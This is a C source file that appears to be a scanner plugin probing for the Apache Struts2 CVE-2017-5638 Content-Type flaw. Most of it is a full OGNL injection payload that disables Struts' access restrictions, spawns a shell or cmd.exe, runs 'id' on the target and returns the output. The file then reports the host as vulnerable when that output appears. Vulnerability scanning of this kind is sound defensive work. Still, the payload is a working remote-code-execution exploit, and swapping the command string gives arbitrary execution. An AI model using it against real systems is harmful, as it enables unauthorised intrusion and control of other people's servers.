/* http-vuln-cve2017-5638 - Apache Struts2 Content-Type OGNL RCE probe. */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    static const char payload[] =
        "%{(#_='multipart/form-data')."
        "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
        "(#_memberAccess?(#_memberAccess=#dm):"
        "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
        "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
        "(#ognlUtil.getExcludedPackageNames().clear())."
        "(#ognlUtil.getExcludedClasses().clear())."
        "(#context.setMemberAccess(#dm))))."
        "(#cmd='id')."
        "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
        "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
        "(#p=new java.lang.ProcessBuilder(#cmds))."
        "(#p.redirectErrorStream(true)).(#process=#p.start())."
        "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
        "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
        "(#ros.flush())}";
    char resp[8192];
    const char *body;
    int n;

    if (!ar_valid(ctx)) {
        return 1;
    }
    n = ar_http_request(ctx, "POST", "/", NULL, NULL, "", payload,
                        resp, sizeof(resp));
    if (n <= 0) {
        ar_out(ctx, "Struts2 CVE-2017-5638: no response");
        return 0;
    }
    body = ar_http_body(resp);
    if (strstr(body, "uid=") != NULL || strstr(body, "gid=") != NULL ||
        strstr(body, "VULNERABLE") != NULL) {
        ar_out(ctx, "VULNERABLE: Apache Struts2 CVE-2017-5638 command execution");
    } else {
        ar_out(ctx, "not vulnerable: Apache Struts2 CVE-2017-5638 (HTTP %d)",
               ar_http_status(resp));
    }
    return 0;
}
